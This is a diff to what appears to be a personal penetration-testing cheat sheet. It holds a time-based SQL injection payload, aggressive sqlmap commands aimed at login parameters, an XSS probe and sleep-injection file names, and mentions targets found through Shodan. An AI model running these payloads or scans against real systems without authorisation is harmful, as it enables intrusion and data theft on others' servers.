@@ -49,9 +49,18 @@ or maby because lot of these sql i found it from shodan ips
 all the time i try Sql  in user parameter 
 1)
 i used sleep payload
-';WAITFOR DELAY '0:0:5'-- 
+`';WAITFOR DELAY '0:0:5'-- `
 and the server get DELAY for 5 s
 2)
 save Post request in txt
+```
 sqlmap -r txt -p user --force-ssl --level 5 --risk 3
 sqlmap -r request.txt -p email/username --force-ssl -level 5 --risk 3 --dbms="MySQL" --test-filter="MySQL >= 5.0.12 AND time-based blind (query SLEEP)"
+```
+```
+"><img src=x onerror=alert(document.domain)>
+--sleep(15).png
+--sleep(6*3).png
+--sleep(25).png
+--sleep(5*7).png
+```
